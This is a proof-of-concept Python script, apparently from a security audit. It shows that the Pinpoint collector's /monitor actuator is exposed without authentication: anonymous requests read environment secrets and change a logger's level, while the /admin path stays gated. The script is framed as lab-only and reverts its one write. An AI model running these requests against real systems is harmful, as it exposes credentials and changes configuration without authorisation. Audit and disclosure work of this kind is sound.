#!/usr/bin/env python3
"""F3 PoC (audit lead C4) — Pinpoint collector actuator (/monitor) served without authentication.

Detection-first, one deliberately neutral write:
  1. anonymous GET  /monitor/env            must return 200 AND carry the
     researcher-planted secret markers (the disclosure itself);
  2. anonymous GET  /monitor/loggers/<name> must return 200 (read control);
  3. anonymous POST /monitor/loggers/<name> sets DEBUG and an anonymous
     read confirms the change (the write capability), then reverts to the
     original effective level INFO — no trace-spam, no destructive change;
  4. anonymous GET  /admin/<anything>       must be refused (401/403) — the
     differential: the same port, the same client, one surface gated and
     one not.
Exits non-zero if the claimed observation chain is not reproduced.
Lab target only, via --confirm-authorised.
"""
import argparse
import http.client
import json
import sys
import urllib.parse

SECRET_MARKERS = ("verify-admin-pw", "verify-dummy-pw", "verify-redis-pw")
LOGGER_NAME = "com.navercorp.pinpoint.collector"


def fetch(method, url, data=None, headers=None):
    u = urllib.parse.urlsplit(url)
    conn = http.client.HTTPConnection(u.hostname, u.port, timeout=15)
    path = u.path + ("?" + u.query if u.query else "")
    h = dict(headers or {})
    if isinstance(data, (dict, list)):
        data = json.dumps(data).encode()
        h.setdefault("Content-Type", "application/json")
    try:
        conn.request(method, path, body=data, headers=h)
        r = conn.getresponse()
        return r.status, r.read()
    finally:
        conn.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--collector-base", required=True, help="e.g. http://127.0.0.1:8081")
    ap.add_argument("--confirm-authorised", action="store_true",
                    help="acknowledge the target is a lab you are authorized to test")
    args = ap.parse_args()
    if not args.confirm_authorised:
        print("refusing to run: pass --confirm-authorised to acknowledge lab authorization",
              file=sys.stderr)
        return 2

    base = args.collector_base
    failures = []

    # 1. the disclosure
    st, body = fetch("GET", base + "/monitor/env")
    text = body.decode("utf-8", "replace")
    found = [m for m in SECRET_MARKERS if m in text]
    print(f"[1] anonymous GET /monitor/env -> {st}, {len(body)} bytes; "
          f"planted markers present: {found}")
    if st != 200 or len(found) < 2:
        failures.append(f"disclosure not observed: status {st}, markers {found}")

    # 2. read control on the writable endpoint
    st_lg, lg_body = fetch("GET", base + f"/monitor/loggers/{LOGGER_NAME}")
    print(f"[2] anonymous GET /monitor/loggers/{LOGGER_NAME} -> {st_lg} {lg_body[:80]!r}")
    if st_lg != 200:
        failures.append(f"logger read not open: status {st_lg}")

    # 3. write capability: a real change, observed, then reverted to the
    #    same effective level. (Boot's documented reset value, JSON null,
    #    answers 500 on this build — an unhandled request that got past no
    #    gate — so the revert reconfigures to the original effective INFO.)
    st_w, _ = fetch("POST", base + f"/monitor/loggers/{LOGGER_NAME}",
                    data={"configuredLevel": "DEBUG"})
    st_v, v_body = fetch("GET", base + f"/monitor/loggers/{LOGGER_NAME}")
    configured = b'"configuredLevel":"DEBUG"' in v_body
    print(f"[3] anonymous POST /monitor/loggers/<name> (configuredLevel=DEBUG) -> {st_w} "
          f"(expect 2xx); anonymous GET now shows: {v_body[:90]!r}")
    if not (200 <= st_w < 300) or st_v != 200 or not configured:
        failures.append(f"write not observed: post {st_w}, verify {st_v}, configured DEBUG {configured}")
    st_r, _ = fetch("POST", base + f"/monitor/loggers/{LOGGER_NAME}",
                    data={"configuredLevel": "INFO"})
    print(f"[3r] revert POST (configuredLevel=INFO, matching the prior effective level) -> {st_r}")
    if not (200 <= st_r < 300):
        failures.append(f"revert failed: status {st_r} — logger may still be at DEBUG")

    # 4. differential: the password-gated surface on the SAME port
    st_adm, _ = fetch("GET", base + "/admin/enableAccess")
    print(f"[4] anonymous GET /admin/enableAccess -> {st_adm} (expect 401/403 — gated)")
    if st_adm not in (401, 403):
        failures.append(f"admin differential mismatch: status {st_adm}")

    if failures:
        for f in failures:
            print("FAIL:", f, file=sys.stderr)
        return 1
    print("OK: unauthenticated actuator disclosure + runtime write observed, "
          "and the /admin gate refuses the same anonymous client "
          "(no destructive operation performed)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
